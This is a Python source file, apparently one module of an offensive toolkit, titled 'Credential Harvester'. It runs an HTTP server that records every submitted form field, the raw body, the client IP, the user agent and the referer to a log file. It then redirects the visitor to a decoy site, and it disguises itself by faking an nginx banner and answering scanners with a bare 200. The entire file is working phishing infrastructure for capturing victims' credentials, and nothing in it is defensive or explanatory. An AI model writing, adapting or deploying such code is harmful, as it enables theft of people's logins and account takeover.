# Credential Harvester
# standalone form capture endpoint (no page rendering)

from Config.Colors import *
from Config.Util import *

import os
import json
import time
import threading
import socket
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs


class Harvester(BaseHTTPRequestHandler):
    logfile = None
    redirect_to = "https://www.google.com"
    server_version = "nginx"
    lock = threading.Lock()

    def log_message(self, *a, **k):
        return

    def _write_entry(self, entry):
        with Harvester.lock:
            try:
                with open(self.logfile, "a", encoding="utf-8") as f:
                    f.write(json.dumps(entry, ensure_ascii=False) + "\n")
            except Exception:
                pass

    def do_GET(self):
        # bare 200 so scanners don't 404
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(length).decode("utf-8", "ignore") if length else ""
        form = parse_qs(raw, keep_blank_values=True)
        entry = {
            "time": datetime.now().isoformat(),
            "ip": self.client_address[0],
            "port": self.client_address[1],
            "ua": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
            "path": self.path,
            "form": {k: v for k, v in form.items()},
            "raw": raw,
        }
        self._write_entry(entry)

        allv = []
        for k, vs in form.items():
            for v in vs:
                allv.append(f"{k}={v}")
        log(f"hit  {self.client_address[0]}  {' '.join(allv)[:120]}", "ok")

        self.send_response(302)
        self.send_header("Location", self.redirect_to)
        self.end_headers()


def run():
    banner()
    log("Credential Harvester", "info")
    print(f"{DIM}POST-only endpoint that logs any form submission.{RESET}")
    print()

    port_str = input_line("port [8080] > ").strip() or "8080"
    try:
        port = int(port_str)
    except ValueError:
        port = 8080
    redirect_to = input_line("redirect after POST [https://www.google.com] > ").strip() \
        or "https://www.google.com"

    logfile = os.path.join(output_dir(),
                           f"harvest_{datetime.now().strftime('%Y%m%d%H%M%S')}.log")
    Harvester.logfile = logfile
    Harvester.redirect_to = redirect_to

    try:
        srv = ThreadingHTTPServer(("0.0.0.0", port), Harvester)
    except OSError as e:
        log(f"bind failed: {e}", "err"); pause(); return

    log(f"listening on 0.0.0.0:{port}", "info")
    log(f"logfile -> {logfile}", "info")
    print(f"\n{DIM}ctrl+c to stop{RESET}\n")

    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
    finally:
        try:
            srv.shutdown(); srv.server_close()
        except Exception:
            pass
        log("stopped", "ok")
        pause()